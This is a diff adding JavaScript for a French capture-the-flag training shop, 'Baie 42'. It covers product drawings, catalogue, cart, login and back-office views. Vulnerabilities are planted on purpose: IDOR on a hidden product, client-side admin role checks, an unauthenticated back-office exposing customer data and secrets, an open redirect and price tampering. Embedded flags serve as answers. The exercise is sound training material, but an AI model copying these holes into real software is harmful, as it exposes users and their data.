+  switch48(){const w=480,h=44;return chassis(w,h)+`<rect x="22" y="8" width="44" height="28" rx="2" fill="var(--steel-2)"/><text x="27" y="26" font-family="IBM Plex Sans Condensed,Arial Narrow,sans-serif" font-size="10" font-weight="700" fill="var(--panel)">S48-L3</text>`+portRow(74,8,24,11,3)+portRow(74,24,24,11,3)+leds(74,4,24,14,"var(--led)")+`<rect x="414" y="10" width="16" height="24" rx="1" fill="var(--port)"/><rect x="434" y="10" width="16" height="24" rx="1" fill="var(--port)"/><circle cx="458" cy="21" r="3" fill="var(--led)"/>`},
+  switch8(){const w=480,h=44;return chassis(w,h)+`<rect x="24" y="8" width="52" height="28" rx="2" fill="var(--steel-2)"/><text x="29" y="26" font-family="IBM Plex Sans Condensed,Arial Narrow,sans-serif" font-size="11" font-weight="700" fill="var(--panel)">S8 LITE</text>`+portRow(92,14,8,20,8)+leds(92,8,8,28,"var(--led)")+`<rect x="420" y="12" width="40" height="20" rx="2" fill="var(--steel-2)"/><circle cx="450" cy="22" r="3" fill="var(--led)"/>`},
+  server1u(){const w=480,h=44;let s=chassis(w,h);for(let i=0;i<4;i++){const x=24+i*76;s+=`<rect x="${x}" y="7" width="70" height="30" rx="2" fill="var(--steel-2)"/><rect x="${x+4}" y="11" width="50" height="22" rx="1" fill="var(--hole)"/><circle cx="${x+62}" cy="15" r="2" fill="var(--led)"/><circle cx="${x+62}" cy="27" r="2" fill="${i===2?"var(--amber)":"var(--led)"}"/>`}for(let i=0;i<14;i++)s+=`<rect x="${334+i*6}" y="9" width="3" height="26" fill="var(--hole)"/>`;s+=`<circle cx="438" cy="22" r="7" fill="var(--steel-2)"/><circle cx="438" cy="22" r="3.2" fill="var(--port)"/><circle cx="456" cy="16" r="2" fill="var(--led)"/>`;return s},
+  server2u(){const w=480,h=88;let s=chassis(w,h);for(let r=0;r<2;r++)for(let i=0;i<6;i++){const x=24+i*58,y=8+r*38;s+=`<rect x="${x}" y="${y}" width="54" height="34" rx="2" fill="var(--steel-2)"/><rect x="${x+4}" y="${y+4}" width="38" height="26" rx="1" fill="var(--hole)"/><circle cx="${x+48}" cy="${y+9}" r="2" fill="var(--led)"/><circle cx="${x+48}" cy="${y+18}" r="2" fill="var(--port)"/>`}s+=`<rect x="378" y="10" width="74" height="22" rx="2" fill="var(--panel)"/><text x="385" y="25" font-family="IBM Plex Sans Condensed,Arial Narrow,sans-serif" font-size="11" font-weight="700" fill="var(--steel)">FORGE R2</text>`;for(let i=0;i<10;i++)s+=`<rect x="${380+i*7}" y="40" width="3" height="36" fill="var(--hole)"/>`;s+=`<circle cx="458" cy="70" r="6" fill="var(--steel-2)"/><circle cx="458" cy="70" r="2.6" fill="var(--led)"/>`;return s},
+  storage(){const w=480,h=88;let s=chassis(w,h);for(let r=0;r<2;r++)for(let i=0;i<12;i++){const x=22+i*37,y=8+r*38;s+=`<rect x="${x}" y="${y}" width="33" height="34" rx="2" fill="var(--steel-2)"/><rect x="${x+5}" y="${y+6}" width="4" height="22" rx="1" fill="var(--hole)"/><circle cx="${x+24}" cy="${y+10}" r="2" fill="${(i+r)%6===0?"var(--amber)":"var(--led)"}"/>`}return s},
+  proxy(label,ok){const w=480,h=44;let s=chassis(w,h)+`<rect x="24" y="8" width="128" height="28" rx="2" fill="var(--hole)"/><text x="32" y="27" font-family="IBM Plex Mono,monospace" font-size="12" fill="${ok?"var(--led)":"var(--amber)"}">${label}</text>`;s+=portRow(170,10,4,18,6)+portRow(170,24,4,18,6);s+=`<rect x="276" y="10" width="22" height="24" rx="1" fill="var(--port)"/>`;for(let i=0;i<16;i++)s+=`<rect x="${312+i*6}" y="9" width="3" height="26" fill="var(--hole)"/>`;s+=`<circle cx="426" cy="16" r="2.4" fill="var(--led)"/><circle cx="426" cy="28" r="2.4" fill="var(--amber)"/><circle cx="450" cy="22" r="6" fill="var(--steel-2)"/>`;return s},
+  firewall(){const w=480,h=44;let s=chassis(w,h)+`<rect x="24" y="8" width="150" height="28" rx="2" fill="var(--danger)"/><text x="34" y="27" font-family="IBM Plex Sans Condensed,Arial Narrow,sans-serif" font-size="13" font-weight="700" fill="var(--surface)">PARE-FEU NG</text>`;s+=portRow(190,10,6,20,7)+portRow(190,24,6,20,7);s+=`<circle cx="356" cy="22" r="7" fill="var(--steel-2)"/><rect x="380" y="10" width="20" height="24" rx="1" fill="var(--port)"/><rect x="404" y="10" width="20" height="24" rx="1" fill="var(--port)"/><circle cx="450" cy="22" r="3" fill="var(--led)"/>`;return s},
+  ups(){const w=480,h=88;let s=chassis(w,h)+`<rect x="24" y="10" width="200" height="68" rx="3" fill="var(--steel-2)"/><rect x="36" y="22" width="176" height="30" rx="2" fill="var(--hole)"/><text x="48" y="43" font-family="IBM Plex Mono,monospace" font-size="16" fill="var(--led)">230V  98%</text>`;for(let i=0;i<5;i++)s+=`<rect x="${40+i*34}" y="58" width="24" height="10" rx="2" fill="var(--led)"/>`;s+=`<rect x="250" y="16" width="200" height="56" rx="3" fill="var(--steel-2)"/>`;for(let i=0;i<6;i++)s+=`<circle cx="${280+i*28}" cy="44" r="9" fill="var(--hole)"/><circle cx="${280+i*28}" cy="44" r="4" fill="var(--metal-2)"/>`;return s},
+  pdu(){const w=480,h=44;let s=chassis(w,h);for(let i=0;i<12;i++)s+=`<circle cx="${40+i*35}" cy="22" r="9" fill="var(--hole)"/><circle cx="${40+i*35}" cy="22" r="4" fill="var(--metal-2)"/><circle cx="${40+i*35}" cy="10" r="1.6" fill="${i%3===0?"var(--amber)":"var(--led)"}"/>`;return s},
+  blank(){const w=480,h=44;let s=`<rect x="14" y="1" width="452" height="42" rx="1" fill="var(--metal)"/>`+ears(w,h);for(let i=0;i<30;i++)s+=`<rect x="${40+i*14}" y="19" width="8" height="6" rx="1" fill="var(--metal-2)"/>`;return s}
+};
+function unitSvg(p,cls){const u=p.u||1;return `<svg class="${cls||""}" viewBox="0 0 480 ${44*u}" role="img" aria-label="${esc(p.name)}">${p.draw()}</svg>`}
+
+/* ---- catalogue ---- */
+const PRODUCTS=[
+  {id:1,name:"Alpine S8 Lite",cat:"Switch",price:179,u:1,draw:()=>DRAW.switch8(),
+   desc:"Petit switch 8 ports Gigabit non manageable, pour un poste de travail ou une petite baie d'appoint.",
+   specs:[["Ports","8 x 1 GbE"],["Gestion","Aucune (plug and play)"],["Alimentation","Externe 12 V"],["Hauteur","1U demi-largeur"]]},
+  {id:2,name:"Alpine S24 PoE+",cat:"Switch",price:689,u:1,draw:()=>DRAW.switch24(),
+   desc:"Switch 24 ports Gigabit PoE+ pour les baies de bureau. Budget PoE de 370 W, de quoi alimenter cameras et bornes Wi-Fi.",
+   specs:[["Ports","24 x 1 GbE PoE+, 2 x SFP+ 10 G"],["Budget PoE","370 W"],["Couche","L2+ (VLAN, LACP, ACL)"],["Hauteur","1U"],["Gestion","Web, SSH, SNMP v3"]]},
+  {id:3,name:"Alpine S48-L3",cat:"Switch",price:2390,u:1,draw:()=>DRAW.switch48(),
+   desc:"Switch 48 ports niveau 3 avec routage OSPF et BGP leger, pour l'agregation d'un etage ou le coeur d'un petit site.",
+   specs:[["Ports","48 x 1 GbE, 4 x SFP28 25 G"],["Couche","L3 (OSPF, BGP, VRF-lite)"],["Commutation","256 Gb/s"],["Hauteur","1U"],["Alimentation","Double, redondante"]]},
+  {id:4,name:"Forge R1",cat:"Serveur",price:3150,u:1,draw:()=>DRAW.server1u(),
+   desc:"Serveur 1U mono-processeur pour l'hebergement de services : annuaire, DNS, petits hyperviseurs.",
+   specs:[["Processeur","16 coeurs, 2,9 GHz"],["Memoire","64 Go ECC (max 512 Go)"],["Stockage","4 baies 2,5\" NVMe"],["Reseau","2 x 10 GbE"],["Hauteur","1U"]]},
+  {id:5,name:"Forge R2",cat:"Serveur",price:6890,u:2,draw:()=>DRAW.server2u(),
+   desc:"Serveur 2U bi-processeur avec 12 baies, taille pour la virtualisation et le stockage de logs.",
+   specs:[["Processeur","2 x 24 coeurs"],["Memoire","256 Go ECC (max 2 To)"],["Stockage","12 baies 3,5\" SAS/SATA"],["Reseau","4 x 25 GbE"],["Hauteur","2U"]]},
+  {id:6,name:"Coffre S12",cat:"Stockage",price:9450,u:2,draw:()=>DRAW.storage(),
+   desc:"Baie de stockage 2U, 24 disques, double controleur. Pour les sauvegardes et le stockage de machines virtuelles.",
+   specs:[["Disques","24 x 3,5\" (max 480 To)"],["Controleurs","2, redondants"],["Protocoles","iSCSI, NFS, SMB"],["Cache","32 Go NVMe"],["Hauteur","2U"]]},
+  {id:7,name:"Relais P200",cat:"Proxy",price:1490,u:1,draw:()=>DRAW.proxy("RELAIS OK",true),
+   desc:"Proxy inverse materiel avec terminaison TLS, cache HTTP et repartition de charge vers vos serveurs web.",
+   specs:[["Debit TLS","4 Gb/s"],["Connexions","500 000 simultanees"],["Fonctions","Cache, repartition, WAF de base"],["Ports","8 x 1 GbE, 1 x SFP+"],["Hauteur","1U"]]},
+  {id:8,name:"Relais P400",cat:"Proxy",price:2290,u:1,draw:()=>DRAW.proxy("FILTRE ON",true),
+   desc:"Proxy sortant avec filtrage d'URL par categories, inspection TLS et journalisation pour la conformite.",
+   specs:[["Utilisateurs","Jusqu'a 2 000"],["Filtrage","URL, categories, listes noires"],["Authentification","LDAP, Kerberos"],["Ports","8 x 1 GbE, 1 x SFP+"],["Cle de licence d'essai (base64)","Q1RGe2I0czM2NF9uM3N0X3A0c19kdV9jaDFmZnIzbTNudH0="]]},
+  {id:9,name:"Rempart NG",cat:"Securite",price:4190,u:1,draw:()=>DRAW.firewall(),
+   desc:"Pare-feu nouvelle generation : inspection applicative, IPS, VPN site a site et acces distant.",
+   specs:[["Debit inspecte","12 Gb/s"],["Sessions","4 millions"],["Fonctions","IPS, antivirus, VPN, filtrage"],["Ports","12 x 1 GbE, 2 x SFP+"],["Hauteur","1U"]]},
+  {id:10,name:"Onduleur U3000",cat:"Energie",price:1890,u:2,draw:()=>DRAW.ups(),
+   desc:"Onduleur en ligne 3000 VA pour proteger une demi-baie contre les coupures et micro-coupures.",
+   specs:[["Puissance","3000 VA / 2700 W"],["Autonomie","11 min a demi-charge"],["Sorties","8 x C13, 1 x C19"],["Supervision","Carte reseau SNMP"],["Hauteur","2U"]]},
+  {id:11,name:"Bandeau PDU-12",cat:"Energie",price:420,u:1,draw:()=>DRAW.pdu(),
+   desc:"Bandeau de 12 prises commutables avec mesure de consommation par prise.",
+   specs:[["Prises","12 x C13 commutables"],["Mesure","Par prise et globale"],["Entree","1 x C20 16 A"],["Supervision","Web, SNMP"],["Hauteur","1U"]]},
+  {id:12,name:"Kit baie 42U",cat:"Baie",price:2750,u:1,draw:()=>DRAW.blank(),
+   desc:"Baie 42U complete : porte ventilee, passages de cables, 2 bandeaux et kit de mise a la terre.",
+   specs:[["Hauteur utile","42U"],["Charge","1200 kg"],["Profondeur","1000 mm"],["Inclus","2 PDU, obturateurs, roulettes"]]},
+  /* ID 99 : prototype non publie, masque du catalogue, fiche encore accessible */
+  {id:99,hidden:true,name:"Relais PX (prototype)",cat:"Non publie",price:0,u:1,draw:()=>DRAW.proxy("PX  BETA",false),
+   desc:"Fiche interne. Ce prototype ne devait pas etre visible du public.",specs:[["Statut","Prototype, ne pas diffuser"],["Code interne",null]]}
+];
+const byId=id=>PRODUCTS.find(p=>p.id===id);
+const CATS=["Tous","Switch","Serveur","Stockage","Proxy","Securite","Energie","Baie"];
+
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]))}
+const eur=n=>new Intl.NumberFormat("fr-FR",{style:"currency",currency:"EUR"}).format(n);
+function rot13(s){return s.replace(/[a-z]/gi,c=>{const b=c<="Z"?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b)})}
+
+/* MD5 minimal (pour le defi d'empreinte) */
+const md5=(function(){function r(n,c){return n<<c|n>>>32-c}function a(a,b,x,s,t){a=(a+ (b&0) + 0)|0;return 0}
+// implementation compacte
+function md5c(str){function to(s){var b=[],i;for(i=0;i<s.length;i++){var c=s.charCodeAt(i);if(c<128)b.push(c);else if(c<2048){b.push(192|c>>6,128|c&63)}else{b.push(224|c>>12,128|c>>6&63,128|c&63)}}return b}
+var x=to(str),len=x.length*8;x.push(128);while(x.length%64!==56)x.push(0);
+var buf=[];for(var i=0;i<x.length;i+=4)buf.push(x[i]|x[i+1]<<8|x[i+2]<<16|x[i+3]<<24);buf.push(len&0xffffffff,0);
+var A=1732584193,B=-271733879,C=-1732584194,D=271733878;
+var S=[7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
+var K=[];for(var i=0;i<64;i++)K[i]=Math.floor(Math.abs(Math.sin(i+1))*4294967296);
+function add(a,b){return a+b|0}
+for(var i=0;i<buf.length;i+=16){var a=A,b=B,c=C,d=D;
+for(var j=0;j<64;j++){var f,g;if(j<16){f=b&c|~b&d;g=j}else if(j<32){f=d&b|~d&c;g=(5*j+1)%16}else if(j<48){f=b^c^d;g=(3*j+5)%16}else{f=c^(b|~d);g=7*j%16}
+var tmp=d;d=c;c=b;var m=buf[i+g]||0;b=add(b,r(add(add(add(a,f),K[j]),m),S[j]));a=tmp}
+A=add(A,a);B=add(B,b);C=add(C,c);D=add(D,d)}
+function hex(n){var s="";for(var i=0;i<4;i++)s+=("0"+(n>>i*8&255).toString(16)).slice(-2);return s}
+return hex(A)+hex(B)+hex(C)+hex(D)}
+return md5c})();
+
+/* ---- panier ---- */
+let cart=[];try{cart=JSON.parse(sGet("baie42_cart","[]"))}catch(e){cart=[]}
+function saveCart(){sSet("baie42_cart",JSON.stringify(cart));updateBadges()}
+function addToCart(id){const l=cart.find(x=>x.id===id);if(l)l.qty+=1;else cart.push({id,qty:1});saveCart()}
+let promoRate=0,promoCount=0;
+
+/* ---- sessions ---- */
+function getSession(){const raw=sGet("baie42_session",null);if(!raw)return null;try{return JSON.parse(atob(raw))}catch(e){return null}}
+function setSession(o){sSet("baie42_session",btoa(JSON.stringify(o)))}
+function b64urlDecode(s){s=s.replace(/-/g,"+").replace(/_/g,"/");while(s.length%4)s+="=";try{return atob(s)}catch(e){return ""}}
+
+function updateBadges(){
+  document.getElementById("cartCount").textContent=cart.reduce((a,l)=>a+(parseInt(l.qty,10)||0),0);
+  document.getElementById("flagCount").textContent=found().length+"/78";
+  const s=getSession();const el=document.getElementById("navLogin");if(el)el.textContent=s?("Compte : "+s.user):"Connexion";
+}
+
+const app=document.getElementById("app");
+function card(p){return `<article class="card"><div class="img">${unitSvg(p)}</div><div class="body"><span class="cat">${esc(p.cat)}</span><a class="title" href="#produit-${p.id}">${esc(p.name)}</a><span class="price">${eur(p.price)}</span><button class="btn" data-add="${p.id}">Ajouter au panier</button></div></article>`}
+
+function rackSvg(){
+  const slots=[{p:3},{p:2},{blank:1},{p:9},{p:7},{p:8},{blank:1},{p:4},{p:5},{p:6},{blank:1},{p:10},{p:11}];
+  let y=12,inner="";const X=40;
+  slots.forEach(s=>{
+    if(s.blank){inner+=`<svg x="${X}" y="${y}" width="480" height="44" viewBox="0 0 480 44">${DRAW.blank()}</svg>`;y+=46;return}
+    const p=byId(s.p),h=44*p.u;
+    inner+=`<a href="#produit-${p.id}" aria-label="${esc(p.name)}"><svg x="${X}" y="${y}" width="480" height="${h}" viewBox="0 0 480 ${h}">${p.draw()}</svg><rect class="unit-hit" x="${X}" y="${y}" width="480" height="${h}" rx="2"/></a>`;
+    y+=h+2;
+  });
+  const H=y+10;let rail="";for(let ry=16;ry<H-10;ry+=15.33){rail+=`<rect x="24" y="${ry}" width="6" height="6" fill="var(--hole)"/><rect x="530" y="${ry}" width="6" height="6" fill="var(--hole)"/>`}
+  return `<svg class="rack" viewBox="0 0 560 ${H}" role="group" aria-label="Baie de demonstration, chaque equipement mene a sa fiche"><rect x="0" y="0" width="560" height="${H}" rx="4" fill="var(--steel)"/><rect x="18" y="6" width="524" height="${H-12}" fill="var(--panel)"/>${rail}${inner}</svg>`;
+}
+
+let shopFilter="Tous",flagDiff="Tous",shopQuery="",pipeTab="apercu",boTab="dashboard",socTab="alertes",edrTab="processus",revTab="chaine",capTab="http",tlOrder=[],cryTab="vigenere";
+const VIEWS={
+  accueil(){const max=CHALLENGES.reduce((a,c)=>a+c.pts,0);return `<section class="hero">
+      <div>
+        <h1>Tout ce qu'il faut pour remplir une <u title="note interne: CTF{1nf0bull3_t1tl3}" style="text-decoration-style:dotted">baie</u></h1>
+        <p class="lead">Switchs, serveurs, stockage, proxys, securite et energie pour les reseaux d'entreprise. Cette boutique cache aussi 40 flags : a toi de trouver les failles laissees par ses developpeurs.</p>
+        <svg width="1" height="1" aria-label="logo baie 42 — tag interne CTF{alt_d3_l1m4g3}" role="img" style="position:absolute"><rect width="1" height="1" fill="transparent"/></svg>
+        <div class="actions"><a class="btn amber" href="#boutique" data-ref="CTF{4ttr1but_d4t4}">Voir le catalogue</a><a class="btn ghost" href="#flags">Voir les epreuves</a></div>
+        <div class="stats"><div><b>12</b><span>produits</span></div><div><b>78</b><span>epreuves</span></div><div><b>${max}</b><span>points en jeu</span></div></div>
+      </div>
+      <div class="rack-wrap">${rackSvg()}<p class="rack-caption">Clique sur un equipement de la baie pour ouvrir sa fiche.</p></div>
+    </section>
+    <div class="section-head"><h2>Les plus demandes</h2><a href="#boutique">Tout le catalogue</a></div>
+    <div class="grid">${[2,9,5,7].map(i=>card(byId(i))).join("")}</div>
+    <div class="section-head"><h2>Par ou commencer</h2></div>
+    <div class="box"><p style="margin-top:0">Les epreuves sont classees par difficulte, de 25 a 200 points. <strong>Debutant ?</strong> Commence par le <a href="#faq">FAQ</a>, le <a href="#sitemap">plan du site</a>, les <a href="#cgv">mentions legales</a> et la page <a href="#reseau">Reseau</a> : une vingtaine de flags faciles s'y cachent (code source, encodages simples, elements masques). <strong>Plus costaud :</strong> la page <a href="#pipeline">CI/CD</a> ajoute 7 defis DevSecOps, et tout l'envers du decor se trouve dans le <a href="#backoffice">back-office</a> (commandes, clients, API, parametres) plus les failles d'achat (prix, commande, bon cadeau, profil). La page <a href="#flags">Flags</a> garde ton score et donne un indice par defi.</p></div>`},
+
+  boutique(){
+    const q=shopQuery.trim().toLowerCase();
+    const list=PRODUCTS.filter(p=>!p.hidden&&(shopFilter==="Tous"||p.cat===shopFilter)&&(!q||(p.name+" "+p.cat+" "+p.desc).toLowerCase().includes(q)));
+    return `<h1>Catalogue</h1><p style="color:var(--muted)">${PRODUCTS.filter(p=>!p.hidden).length} references en ligne.</p>
+    <div style="max-width:420px;margin:.6rem 0"><label for="shopSearch" style="position:absolute;left:-9999px">Rechercher</label><input id="shopSearch" type="search" placeholder="Rechercher un produit..." value="${esc(shopQuery)}"></div>
+    <div class="filters" id="filters">${CATS.map(c=>`<button data-cat="${c}" aria-pressed="${c===shopFilter}">${c}</button>`).join("")}</div>
+    <div class="grid">${list.map(card).join("")||"<p>Aucun produit ne correspond.</p>"}</div>`},
+
+  produit(id){const p=byId(id);
+    if(!p)return `<h1>Fiche introuvable</h1><p>Aucun produit ne porte la reference ${esc(id)}. <a href="#boutique">Retour au catalogue</a></p>`;
+    let extra="";
+    if(p.hidden){markFound("f3");p.specs[1][1]=F("f3");extra=`<div class="notice ok">Tu as accede a une fiche non publiee en changeant l'identifiant dans l'adresse (IDOR). Flag : <span class="flag">${esc(F("f3"))}</span></div>`}
+    const reviews=JSON.parse(sGet("baie42_reviews_"+p.id,"[]")||"[]");
+    return `<p><a href="#boutique">Catalogue</a> / ${esc(p.cat)}</p>
+    <section class="product">
+      <div class="img">${unitSvg(p)}</div>
+      <div class="stack">
+        <h1>${esc(p.name)}</h1>
+        <p>${esc(p.desc)}</p>
+        <p style="font-size:1.6rem;font-weight:600;margin:0">${eur(p.price)}</p>
+        ${p.hidden?"":`<button class="btn amber" data-add="${p.id}">Ajouter au panier</button>`}
+        ${p.hidden?"":`<div class="box stack" style="margin-top:.4rem"><h3 style="margin:0">Faire une offre</h3><p style="margin:0;font-size:.92rem;color:var(--muted)">Propose ton prix : le panier enregistre le montant que tu envoies.</p><form id="offerForm" class="row" data-pid="${p.id}" novalidate><div style="flex:1;min-width:160px"><label for="offer">Ton prix (€)</label><input id="offer" type="number" min="0" step="0.01" value="${p.price}"></div><button class="btn" type="submit">Proposer ce prix</button></form><div id="offerMsg"></div></div>`}
+        ${extra}
+      </div>
+    </section>
+    <div class="section-head"><h2>Fiche technique</h2></div>
+    <div class="box scroll"><table class="specs">${p.specs.map(([k,v])=>`<tr><th>${esc(k)}</th><td>${/licence|base64/i.test(k)?`<code>${esc(v)}</code>`:esc(v)}</td></tr>`).join("")}</table></div>
+    ${id===8?`<div class="box" style="margin-top:1rem"><h3 style="margin-top:0">Telecharger la facture d'exemple</h3><div class="row"><div style="flex:1;min-width:200px"><label for="inv">Nom du fichier</label><input id="inv" value="facture-2026-08.pdf"></div><button class="btn" id="dlInv">Telecharger</button></div><div id="invMsg" style="margin-top:.6rem"></div></div>`:""}
+    <div class="section-head"><h2>Avis clients</h2></div>
+    <div class="box stack">
+      <div id="reviews">${reviews.length?reviews.map(r=>`<div class="review"><div class="who">${esc(r.n)}</div><div>${esc(r.t)}</div></div>`).join(""):"<p style='margin:0;color:var(--muted)'>Aucun avis pour l'instant. Donne le tien.</p>"}</div>
+      <form id="reviewForm" class="stack" novalidate>
+        <div><label for="rn">Ton nom</label><input id="rn" maxlength="60" autocomplete="nickname"></div>
+        <div><label for="rt">Ton avis</label><textarea id="rt" maxlength="600"></textarea></div>
+        <button class="btn" type="submit">Publier l'avis</button>
+        <div id="reviewMsg"></div>
+      </form>
+    </div>`},
+
+  panier(){
+    if(!cart.length)return `<h1>Panier</h1><p>Ton panier est vide. <a href="#boutique">Parcourir le catalogue</a></p>`;
+    const sub=cartSub();const total=sub*(1-promoRate);
+    return `<h1>Panier</h1><div class="box scroll"><table><thead><tr><th>Produit</th><th>Prix unitaire</th><th>Quantite</th><th>Sous-total</th></tr></thead><tbody>${
+      cart.map((l,i)=>{const p=byId(l.id);const pu=linePrice(l);return `<tr><td>${esc(p.name)}${typeof l.prix==="number"?` <span style="color:var(--amber);font-size:.82rem">(prix propose)</span>`:""}</td><td>${eur(pu)}</td><td><input class="qty" type="number" min="1" value="${esc(l.qty)}" data-qty="${i}" aria-label="Quantite ${esc(p.name)}"></td><td>${eur(pu*(parseInt(l.qty,10)||0))}</td></tr>`}).join("")
+    }</tbody></table></div>
+    <div class="box" style="margin-top:1rem"><div class="row"><div style="flex:1;min-width:200px"><label for="promo">Code promo</label><input id="promo" placeholder="ex. BIENVENUE10"></div><button class="btn" id="applyPromo">Appliquer</button></div><div id="promoMsg" style="margin-top:.6rem">${promoRate?`<div class="notice ok">Remise de ${Math.round(promoRate*100)} % appliquee.</div>`:""}</div></div>
+    <div class="box" style="margin-top:1rem"><div class="row"><div style="flex:1;min-width:200px"><label for="gift">Bon cadeau</label><input id="gift" class="mono" placeholder="BA42-XXXX"></div><button class="btn" id="applyGift">Utiliser</button></div><div id="giftMsg" style="margin-top:.6rem"></div></div>
+    <p style="font-size:1.4rem;font-weight:600;margin-top:1rem">Total : <span id="total">${eur(total)}</span></p>
+    <div class="actions"><button class="btn amber" id="checkout">Passer la commande</button><button class="btn ghost" id="clearCart">Vider le panier</button></div>
+    <div id="checkoutMsg" style="margin-top:1rem"></div>`},
+
+  connexion(){const s=getSession();
+    return `<h1>Espace client</h1>
+    ${s?`<div class="notice">Connecte en tant que <strong>${esc(s.user)}</strong> (role : ${esc(s.role)}). <button class="btn ghost" id="logout" style="margin-left:.5rem">Se deconnecter</button></div><p><a href="#admin">Acceder au panneau d'administration</a></p>`:""}
+    <div class="box stack" style="max-width:540px">
+      <form id="loginForm" class="stack" novalidate>
+        <input type="hidden" id="csrf" name="jeton_formulaire" value="CTF{ch4mp_cach3_f0rm}">
+        <div><label for="lu">Identifiant</label><input id="lu" autocomplete="username"></div>
+        <div><label for="lp">Mot de passe</label><input id="lp" type="password" autocomplete="current-password"></div>
+        <button class="btn" type="submit">Se connecter</button>
+      </form>
+      <div><p style="margin:.2rem 0;font-size:.9rem;color:var(--muted)">Mode debogage actif : requete envoyee a la base</p><div class="debug" id="sqlDebug">SELECT * FROM utilisateurs WHERE login='' AND mdp=''</div></div>
+      <div id="loginMsg"></div>
+    </div>
+    <div class="box stack" style="max-width:540px;margin-top:1rem">
+      <h3 style="margin:0">Redirection apres connexion</h3>
+      <p style="margin:0;font-size:.92rem;color:var(--muted)">Le site redirige vers l'adresse passee en parametre, sans la verifier.</p>
+      <form id="redirForm" class="row" novalidate><div style="flex:1;min-width:220px"><label for="redirUrl">Destination (redirect)</label><input id="redirUrl" class="mono" value="/accueil"></div><button class="btn" type="submit">Continuer</button></form>
+      <div id="redirMsg"></div>
+    </div>`},
+
+  admin(){const s=getSession();
+    if(!s)return `<h1>Administration</h1><div class="notice err">Acces refuse : aucune session. <a href="#connexion">Connecte-toi</a> d'abord.</div>`;
+    if(s.role!=="admin")return `<h1>Administration</h1><div class="notice err">Acces refuse : ton role est "${esc(s.role)}", il faut "admin".</div><p style="color:var(--muted)">Le controle est fait par le navigateur a partir de ta session encodee.</p>`;
+    markFound("f6");
+    return `<h1>Administration</h1><div class="notice ok">Bienvenue ${esc(s.user)}. Le serveur ne verifie jamais le role : il a suffi de modifier ta session base64. Flag : <span class="flag">${esc(F("f6"))}</span></div>
+    <div class="section-head"><h2>Stock</h2></div><div class="box scroll"><table>${PRODUCTS.map(p=>`<tr><th>${esc(p.name)}${p.hidden?" (masque)":""}</th><td>${p.hidden?"0":(p.id*7)%23+3} unites</td></tr>`).join("")}</table></div>
+    <div class="section-head"><h2>Zone direction</h2></div><div class="box"><p style="margin-top:0">Le tableau de bord direction est protege par un code PIN a 4 chiffres.</p>${s.role==="admin"?`<a class="btn amber" href="#direction">Ouvrir le panneau direction</a>`:""}</div>`},
+
+  backoffice(){
+    markFound("b1");
+    const tab=boTab;
+    const CUSTOMERS=[
+      {id:1001,nom:"Claire Fontaine",mail:"claire.fontaine@example.com",tel:"06 12 34 56 78",ville:"Lyon"},
+      {id:1002,nom:"Marc Olivier",mail:"m.olivier@example.com",tel:"07 88 22 11 03",ville:"Chatou"},
+      {id:1003,nom:"Sofia Lenoir",mail:"sofia.lenoir@example.com",tel:"06 55 09 77 42",ville:"Nantes"},
+      {id:1004,nom:"admin",mail:"admin@baie42.example",tel:"-",ville:"-"}
+    ];
+    const ORDERS=[
+      {id:1041,client:"Claire Fontaine",total:"3 150,00 €",etat:"expediee"},
+      {id:1042,client:"Marc Olivier",total:"689,00 €",etat:"preparation"},
+      {id:1043,client:"Sofia Lenoir",total:"9 450,00 €",etat:"payee"}
+    ];
+    const panels={
+      dashboard:`<div class="notice ok">Back-office ouvert sans aucune authentification : la page etait seulement "cachee" (absente du menu). Flag : <span class="flag">${esc(F("b1"))}</span></div>
+        <div class="catgrid" style="margin-top:1rem"><div class="c"><b>${CUSTOMERS.length}</b>clients</div><div class="c"><b>${ORDERS.length}</b>commandes</div><div class="c"><b>12</b>produits</div><div class="c"><b>22 289 €</b>chiffre d'affaires</div></div>
+        <p style="color:var(--muted);margin-top:1rem">Onglets : commandes, clients, parametres, et l'API interne. Plusieurs te donnent un flag.</p>`,
+      clients:`<div class="notice ok">Donnees personnelles affichees en clair, sans controle d'acces. Flag : <span class="flag">${esc(F("b2"))}</span></div>
+        <div class="box scroll" style="margin-top:1rem"><table><thead><tr><th>ID</th><th>Nom</th><th>Email</th><th>Telephone</th><th>Ville</th></tr></thead><tbody>${CUSTOMERS.map(c=>`<tr><td>${c.id}</td><td>${esc(c.nom)}</td><td>${esc(c.mail)}</td><td>${esc(c.tel)}</td><td>${esc(c.ville)}</td></tr>`).join("")}</tbody></table></div>`,
+      commandes:`<div class="box scroll"><table><thead><tr><th>N°</th><th>Client</th><th>Total</th><th>Etat</th><th></th></tr></thead><tbody>${ORDERS.map(o=>`<tr><td>#${o.id}</td><td>${esc(o.client)}</td><td>${o.total}</td><td>${esc(o.etat)}</td><td><a href="#commande-${o.id}">voir</a></td></tr>`).join("")}</tbody></table></div><p style="color:var(--muted)">Les fiches commande sont adressees par numero : <code>#commande-1042</code> (reference directe).</p>`,
+      parametres:`<div class="notice ok">La configuration de l'application est affichee ici, secret compris. Flag : <span class="flag">${esc(F("b3"))}</span></div>
+        <div class="term" style="margin-top:1rem">APP_NAME = Baie 42
+APP_ENV = production
+APP_DEBUG = <span class="c-y">true</span>
+APP_SECRET = <span class="c-y">${esc(F("b3"))}</span>
+DB_HOST = 10.0.0.12
+MAIL_FROM = no-reply@baie42.example</div>`,
+      api:`<div class="box"><p style="margin-top:0">Le back-office consomme une API interne pour lister les comptes.</p><div class="row"><div style="flex:1;min-width:220px"><label>Endpoint</label><div class="mono">GET /api/users</div></div><a class="btn" href="#api-users">Appeler l'API</a></div><p style="color:var(--muted);margin:.6rem 0 0">Cette API ne demande aucune authentification.</p></div>`,
+      outils:`<div class="stack">
